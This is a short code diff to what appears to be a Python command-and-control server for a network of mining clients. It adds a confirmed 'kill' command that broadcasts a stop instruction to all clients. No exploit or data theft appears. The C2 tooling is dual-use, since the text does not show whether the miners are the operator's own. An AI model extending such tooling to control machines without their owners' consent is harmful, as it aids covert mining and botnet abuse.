@@ -24,7 +24,7 @@ def server_send_broadcast(message):
 
 
 def server_command_control():
-    valid_commands = ["start", "start_opts", "stop"]
+    valid_commands = ["start", "start_opts", "stop", "kill"]
 
     first_loop = True
 
@@ -44,6 +44,7 @@ def server_command_control():
             print(
                 "ping - Query which miners are on the network and available for commands"
             )
+            print("kill - Kills execution on all available clients (very abruptly)")
             print("help - This message")
             print("exit - Exit the C2 (clients are unaffected)")
 
@@ -60,6 +61,10 @@ def server_command_control():
                     print(f">  {client}")
             else:
                 print("No clients available")
+
+        elif command == "kill":
+            if input("Are you sure you want to kill all clients? (y/N): ").lower() == "y":
+                server_send_broadcast(command)
 
         elif any(
             valid in command for valid in valid_commands
